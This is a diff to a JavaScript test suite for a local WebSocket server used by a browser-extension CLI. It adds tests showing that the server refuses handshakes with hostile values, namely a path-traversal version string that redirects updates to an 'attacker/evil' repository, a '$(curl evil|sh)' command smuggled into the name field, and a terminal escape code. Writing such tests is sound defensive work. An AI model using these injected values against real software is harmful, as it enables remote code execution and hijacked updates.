@@ -1523,6 +1523,41 @@ try {
   h = await cli('health');
   assert(JSON.parse(h.stdout).extension === true, 'server survives malformed WS frame');
 
+  // A seat's ?v=/?name=/?id= reach /health, reply warnings, a suggested
+  // `extreload --profile "<name>"` and update's download URL: a store seat
+  // claiming v=99./../../attacker/evil/archive/main pointed `update` at another
+  // GitHub repo (S1). Only the extension's own shapes get a seat.
+  const seatProbe = (query) =>
+    new Promise((resolve) => {
+      const s = net.connect(PORT, '127.0.0.1');
+      let head = '';
+      let settled = false;
+      const done = () => {
+        if (settled) return;
+        settled = true;
+        resolve(head.includes(' 101 '));
+        s.destroy();
+      };
+      s.on('data', (c) => {
+        head += c;
+        if (head.includes('\r\n\r\n')) done();
+      });
+      s.on('connect', () => s.write(`GET /ws?${query} HTTP/1.1\r\nHost: 127.0.0.1:${PORT}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: ${crypto.randomBytes(16).toString('base64')}\r\nSec-WebSocket-Version: 13\r\n\r\n`));
+      s.on('close', done);
+      s.on('error', done);
+      setTimeout(done, 1000);
+    });
+  for (const query of [
+    `v=${encodeURIComponent('99./../../../../../../attacker/evil/archive/main')}&id=seat-evil-v&install=store`,
+    `v=1.0.0&id=seat-evil-name&name=${encodeURIComponent('$(curl evil|sh)')}&install=dev`,
+    `v=1.0.0&id=${encodeURIComponent('x\u001b[2J')}`,
+    `v=1.0.0&id=seat-empty-name&name=`,
+  ]) assert((await seatProbe(query)) === false, `server: a seat handshake with a hostile value is refused (${query.slice(0, 40)})`);
+  h = await cli('health');
+  assert(!/seat-evil|attacker|curl/.test(h.stdout + h.stderr), 'health never shows a refused seat or its values', h.stdout + h.stderr);
+  assert((await seatProbe('v=1.33.1&id=seat-fine-0a1b&name=poplar&install=dev&boot=1')) === true, 'server: the extension\'s own handshake shape still gets a seat');
+  await new Promise((r) => setTimeout(r, 100)); // let that seat drop before later sections count profiles
+
   // DNS-rebinding guard: a non-loopback Host is refused on every route, even
   // with no Origin/Sec-Fetch headers at all (a rebound page is "same-origin",
   // so those guards don't apply to its GETs — Host is the one header fetch
@@ -1740,7 +1775,7 @@ try {
   // advice stops pointing at extreload, and extreload itself refuses a store
   // build (runtime.reload would re-fetch the same store code).
   {
-    const extS = await wsClient(PORT, 'delta-store', undefined, 'store', '0.0.0-test');
+    const extS = await wsClient(PORT, 'delta-store', undefined, 'store', '0.0.1');
     extS.onMessage((msg) => {
       if (msg.type === 'ping') return extS.send({ id: msg.id, ok: true, result: 'pong' });
       return extS.send({ id: msg.id, ok: true, result: null });
@@ -1748,7 +1783,7 @@ try {
     await new Promise((r) => setTimeout(r, 100));
     const hh = await cli('health');
     assert(JSON.parse(hh.stdout).profiles.find((p) => p.id === 'delta-store')?.install === 'store', 'health reports install=store from the handshake', hh.stdout);
-    assert(hh.stderr.includes('is ahead of the Chrome Web Store extension 0.0.0-test') && hh.stderr.includes('cli.mjs update') && !hh.stderr.includes('extreload'), 'health: a store seat older than the checkout gets update advice (match it), not extreload', hh.stderr);
+    assert(hh.stderr.includes('is ahead of the Chrome Web Store extension 0.0.1') && hh.stderr.includes('cli.mjs update') && !hh.stderr.includes('extreload'), 'health: a store seat older than the checkout gets update advice (match it), not extreload', hh.stderr);
     const xr = await cli('extreload', '--profile', 'delta-store');
     assert(xr.status !== 0 && xr.stderr.includes('updates via the store'), 'extreload refuses a store-installed extension', xr.stdout + xr.stderr);
     extS.socket.destroy();
